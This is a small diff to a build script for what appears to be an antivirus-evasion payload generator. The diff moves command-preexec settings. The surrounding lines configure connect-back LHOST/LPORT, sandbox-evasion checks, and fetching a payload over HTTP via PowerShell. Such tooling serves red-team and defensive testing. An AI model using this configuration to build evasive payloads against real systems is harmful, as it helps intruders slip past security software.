@@ -29,6 +29,9 @@ cat banner.txt
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# no command preexec
+set_command_source no_data
+set_command_exec no_command
 # enable debug output
 enable_debug_print
 #CONFIGURATION_END
@@ -44,10 +47,6 @@ $win32_compiler test_payloads/exec_calc.c -shared -o output/exec_calc.dll
 add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
 add_evasion gethostbyname_sandbox_evasion 'this.that'
 reset_evasion_technique_counter
-
-# no command preexec
-set_command_source no_data
-set_command_exec no_command
 
 # payload will be downloaded from HTTP source via powershell
 set_payload_source download_powershell
